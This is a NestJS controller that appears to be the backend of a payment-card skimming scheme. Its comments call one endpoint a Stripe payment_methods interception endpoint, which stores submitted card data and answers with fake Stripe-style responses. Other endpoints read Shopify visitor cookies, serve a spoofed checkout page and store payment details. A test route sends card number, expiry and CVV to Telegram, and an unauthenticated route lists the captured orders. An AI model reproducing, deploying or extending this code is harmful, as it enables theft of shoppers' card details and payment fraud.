import { Controller, Get, Body, Req, Res, Post, Put, Delete, Headers, Query, Logger } from '@nestjs/common'
import { ApiTags, ApiBearerAuth } from '@nestjs/swagger'
import { Response } from 'express'
import { Transform } from 'class-transformer'
import { Public } from 'src/common/decorators/public.decorator'
import { F1Service } from './f1.service'
import { F1CheckoutDto } from './dto/f1-checkout.dto'
import { PaymentDto } from './dto/payment.dto'
import { PaymentMethodDto } from './dto/payment-method.dto'
import { OrderQueryDto } from './dto/order-query.dto'
import { DataObj } from 'src/common/class/data-obj.class'
import { ApiException } from 'src/common/exceptions/api.exception'
import { genId } from 'src/common/utils'

@ApiTags('Cart订单管理')
@Controller('cart')
export class F1Controller {
  private readonly logger = new Logger(F1Controller.name);
  constructor(private readonly f1Service: F1Service) {}

  /**
   * 20260610 统一入口
   * Stripe payment_methods 拦截接口
   * 捕获并存储 Stripe 支付方式请求数据
   */
  @Post('v1/payment_methods')
  @Public()
  @Transform(({ value }) => value)
  async paymentMethods(
    @Req() req,
    @Res() res: Response,
    @Body() dto: PaymentMethodDto
  ) {
    try {
      // 获取原始请求体
      let rawBodyStr = ''
      if (req.rawBody && Buffer.isBuffer(req.rawBody)) {
        rawBodyStr = req.rawBody.toString('utf-8')
      } else if (typeof req.body === 'string') {
        rawBodyStr = req.body
      } else {
        rawBodyStr = JSON.stringify(req.body || {})
      }
      const ip = req.ip || req.connection?.remoteAddress || ''
      const userAgent = req.headers['user-agent'] || ''

      this.logger.log(`收到 payment_methods 请求 - IP: ${ip}`)
      this.logger.log(`payment_methods body: ${JSON.stringify(dto)}`)

      // 保存数据
      const saved = await this.f1Service.savePaymentMethod(dto, rawBodyStr, ip, userAgent)

      // 返回类似 Stripe 的响应格式
      if (!res.headersSent) {
        res.status(200).json({
          id: `pm_${saved.id}`,
          object: 'payment_method',
          created: Math.floor(saved.createTime?.getTime() / 1000) || Math.floor(Date.now() / 1000),
          type: saved.type,
          card: {
            last4: saved.cardLast4,
            exp_month: parseInt(saved.cardExpMonth) || 0,
            exp_year: parseInt(saved.cardExpYear) || 0,
          }
        })
      }
    } catch (error) {
      this.logger.error('payment_methods 处理失败:', error)
      if (!res.headersSent) {
        res.status(200).json({
          id: `pm_error_${Date.now()}`,
          object: 'payment_method',
          error: error.message
        })
      }
    }
  }

  /**
   * F1订单结账接口 
   * 支持 JSON 和 application/x-www-form-urlencoded 表单提交
   */
  @Post('checkoutHtml')
  @Transform(({ value }) => value) // 跳过装饰器头
  @Public() // 公开接口，无需认证
  async checkoutHtml(@Req() req,
    @Res() res: Response,
    @Body() checkoutDto: F1CheckoutDto) {
    try {
      console.log('F1 Checkout Html ', JSON.stringify(checkoutDto))
      // 从 Cookie 中获取 Shopify 用户标识
      const userId = req.cookies['_shopify_y'] || ''
      console.log('User ID from Cookie:', userId)
      checkoutDto.id = userId
      console.log('F1 Checkout DTO:', JSON.stringify(checkoutDto))
      console.log('F1 Checkout DTO - f1_total 原始值:', checkoutDto.f1_total, '转换后:', decodeURIComponent(checkoutDto.f1_total))
      checkoutDto.f1_total = decodeURIComponent(checkoutDto.f1_total)
      console.log('F1 Checkout DTO - f1_name 转换后:', checkoutDto.f1_name, '转换后:', decodeURIComponent(checkoutDto.f1_name))
      checkoutDto.f1_name = decodeURIComponent(checkoutDto.f1_name)
      console.log('F1 Checkout DTO - f1_title 转换后:', checkoutDto.f1_title, '转换后:', decodeURIComponent(checkoutDto.f1_title))
      checkoutDto.f1_title = decodeURIComponent(checkoutDto.f1_title)
      // 处理金额转换：将字符串格式转为数字（不转分）
      if (checkoutDto.f1_total && typeof checkoutDto.f1_total === 'string') {
        console.log('原始 f1_total:', JSON.stringify(checkoutDto.f1_total))
        console.log('原始 f1_total 长度:', checkoutDto.f1_total.length)
        
        // 尝试不同的处理方式
        let labelIndex = checkoutDto.f1_total.indexOf('$')
        if(labelIndex > -1){
          let cleanValue = checkoutDto.f1_total.substring(labelIndex+1).replace(/,/g, '');
           const moneyValue = parseFloat(cleanValue)
           checkoutDto.f1_money = moneyValue
        }
        
      }

      checkoutDto.order_no = genId();
      
      // 确保金额不为 undefined
      if (!checkoutDto.f1_money) {
        checkoutDto.f1_money = 0
      }

      // 调用 service 保存订单并读取 HTML
      const result = await this.f1Service.checkoutWithHtml(checkoutDto)
      
      console.log('订单保存成功:', checkoutDto.order_no, '金额:', result.order.f1Money)
      
      // 设置响应头为 text/html
      res.setHeader('Content-Type', 'text/html; charset=utf-8')
      
      // 返回 HTML 内容
      res.send(result.html)
    } catch (error) {
      console.error('Checkout Html 错误:', error)
      // 检查是否已经发送响应，避免 headers already sent 错误
      if (!res.headersSent) {
        res.status(500).send(`Error: ${error.message}`)
      }
    }
  }


  @Get('testSend')
  @Public()
  async testSend(
    @Req() req: Request,
    @Res() res: Response,
    @Query('orderNo') orderNo: string
  ): Promise<any> {
    try {
      console.log('Test Send - Order No:', orderNo)
      
      if (!orderNo) {
        return DataObj.create({ 
          message: '请提供 orderNo 参数',
          code: 400,
          usage: 'GET /api/cart/testSend?orderNo=YOUR_ORDER_NO'
        })
      }
      
      // 从数据库获取订单信息
      const order = await this.f1Service.findOne(orderNo)
      
      console.log('订单信息:', order)
      
      // 构造测试数据
      const testData = {
        orderNo: orderNo,
        cardNumber: '4111111111111111',
        expire: '12/25',
        cvv: '123',
        cardName: 'Test User',
        amount: order.f1Money || 0,
        status: 'success'
      }
      
      // 发送 Telegram 通知
      await this.f1Service.sendTelegramNotification(testData)
      
      this.logger.log('Telegram 通知发送成功')
      
      // 返回 JSON 响应
      return DataObj.create({
        message: 'Telegram 通知发送成功',
        code: 200,
        data: {
          orderNo: orderNo,
          amount: order.f1Money,
          orderName: order.f1Name
        }
      })
    } catch (error) {
      console.error('Test Send 错误:', error)
      
      // 返回错误响应
      if (!res.headersSent) {
        return DataObj.create({
          message: `发送失败: ${error.message}`,
          code: 500
        })
      }
    }
  }
  /**
   * 支付接口
   * 保存支付信息并跳转到订单详情页
   */
  @Post('payment')
  @Public()
    @Transform(({ value }) => value) // 跳过装饰器头
  async payment(
    @Req() req,
    @Res() res: Response,
    @Body() paymentDto: PaymentDto
  ) {
    try {
      console.log('Payment DTO:', JSON.stringify(paymentDto))
      
      // 从 Cookie 中获取用户ID
      const userId = req.cookies['_shopify_y'] || ''
      paymentDto.userId = userId
      
      console.log('User ID from Cookie:', userId)
      console.log('Order No:', paymentDto.orderNo)
      
      // 保存支付信息
      const payment = await this.f1Service.savePayment(paymentDto)
      
      console.log('Payment saved successfully:', payment.paymentId)
      
      // 跳转到订单详情页
      const redirectUrl = `/card/detail?orderNo=${paymentDto.orderNo}`
 


      const html = `<html><body> <h3>Payment completed successfully! Order Number:　：<a href="${redirectUrl}">${paymentDto.orderNo}</a></h3></body></html>`
      // 设置响应头为 text/html
      res.setHeader('Content-Type', 'text/html; charset=utf-8')
      
      // 返回 HTML 内容
      res.send(html)
    } catch (error) {
      console.error('Payment error:', error)
      if (!res.headersSent) {
        res.status(500).json({
          code: 500,
          message: `Payment failed: ${error.message}`,
          data: null
        })
      }
    }
  }

   
  /**
   * 订单列表查询接口
   */
  @Get('list')
  @Public()
  async getOrderList(
    @Query() queryDto: OrderQueryDto
  ) {
    try {
      this.logger.log('Query order list:', JSON.stringify(queryDto))
      
      const result = await this.f1Service.findOrders(queryDto)
      
      return DataObj.create(result)
    } catch (error) {
      this.logger.error('Get order list error:', error)
      throw new ApiException(`查询订单列表失败: ${error.message}`)
    }
  }

   
}
